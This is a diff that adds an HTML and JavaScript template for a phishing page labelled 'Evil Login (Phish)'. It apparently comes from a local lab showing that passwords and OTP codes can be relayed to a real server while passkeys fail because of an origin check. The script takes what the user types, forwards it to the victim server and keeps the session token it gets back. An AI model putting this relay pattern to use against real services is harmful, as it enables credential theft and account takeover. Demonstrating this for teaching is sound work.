@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Evil Login (Phish)</title>
+  <link href="{{ url_for('static', filename='styles/style.css') }}" rel="stylesheet" />
+</head>
+<body>
+  <h2 id="header">👿 Evil Login</h2>
+  <input id="user" placeholder="Username">
+  <input id="pass" placeholder="Password" type="password">
+  <button onclick="login()">Log in (phish)</button>
+  <button onclick="loginWithPasskey()">Sign in with Passkey (phish)</button>
+
+  <div id="mfaPanel" style="display:none; margin-top: 1rem;">
+    <h3>MFA required</h3>
+    <div id="mfaStatus" style="margin-bottom:.5rem;"></div>
+    <input id="otp" placeholder="Enter OTP code">
+    <button onclick="verifyMFA()">Verify OTP</button>
+  </div>
+
+  <pre id="result"></pre>
+
+  <script>
+    // REAL server (victim) — cross-origin!
+    const base = "http://localhost:5000";
+    let lastUsername = "";
+    let hmac_tag = "";
+
+    function b64urlToBuf(b64url) {
+      const pad = '='.repeat((4 - b64url.length % 4) % 4);
+      const b64 = (b64url + pad).replace(/-/g, '+').replace(/_/g, '/');
+      const raw = atob(b64);
+      const buf = new ArrayBuffer(raw.length);
+      const bytes = new Uint8Array(buf);
+      for (let i = 0; i < raw.length; ++i) bytes[i] = raw.charCodeAt(i);
+      return buf;
+    }
+    function bufToB64url(buf) {
+      const bytes = new Uint8Array(buf);
+      let s = '';
+      for (const b of bytes) s += String.fromCharCode(b);
+      return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/,'');
+    }
+
+    async function login() {
+      const username = document.getElementById("user").value;
+      const password = document.getElementById("pass").value;
+      lastUsername = username;
+
+      const res = await fetch(`${base}/login`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ username, password })
+      });
+      const json = await res.json();
+      document.getElementById("result").textContent = JSON.stringify(json, null, 2);
+
+      if (json.mfa_required) {
+        document.getElementById("mfaPanel").style.display = "block";
+      } else if (json.hmac) {
+        hmac_tag = json.hmac; // attacker gets token!
+      }
+    }
+
+    async function verifyMFA() {
+      const code = document.getElementById("otp").value;
+      const res = await fetch(`${base}/mfa/verify`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ username: lastUsername, code, window:0, look_ahead:0 })
+      });
+      const json = await res.json();
+      document.getElementById("result").textContent = JSON.stringify(json, null, 2);
+      if (json.hmac) {
+        hmac_tag = json.hmac; // ✅ OTP succeeded via phish
+      }
+    }
+
+    async function loginWithPasskey() {
+      const username = document.getElementById("user").value;
+      if (!username) return alert("Enter username");
+      lastUsername = username;
+
+      // get options from victim server
+      const optRes = await fetch(`${base}/webauthn/authenticate/options`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ username })
+      });
+      const options = await optRes.json();
+      if (optRes.status !== 200) {
+        document.getElementById("result").textContent = JSON.stringify(options, null, 2);
+        return;
+      }
+      options.challenge = b64urlToBuf(options.challenge);
+      if (Array.isArray(options.allowCredentials)) {
+        options.allowCredentials = options.allowCredentials.map(c => ({...c, id: b64urlToBuf(c.id)}));
+      }
+
+      // Browser on THIS origin (http://evil.test:5001)!
+      const assertion = await navigator.credentials.get({ publicKey: options });
+      const credential = {
+        id: assertion.id,
+        type: assertion.type,
+        rawId: bufToB64url(assertion.rawId),
+        response: {
+          authenticatorData: bufToB64url(assertion.response.authenticatorData),
+          clientDataJSON: bufToB64url(assertion.response.clientDataJSON),
+          signature: bufToB64url(assertion.response.signature),
+          userHandle: assertion.response.userHandle ? bufToB64url(assertion.response.userHandle) : null
+        }
+      };
+
+      // send to victim server for verification -> should FAIL (origin mismatch)
+      const v = await fetch(`${base}/webauthn/authenticate/verify`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ username, credential })
+      });
+      const j = await v.json();
+      document.getElementById("result").textContent = JSON.stringify(j, null, 2);
+    }
+  </script>
+</body>
+</html>
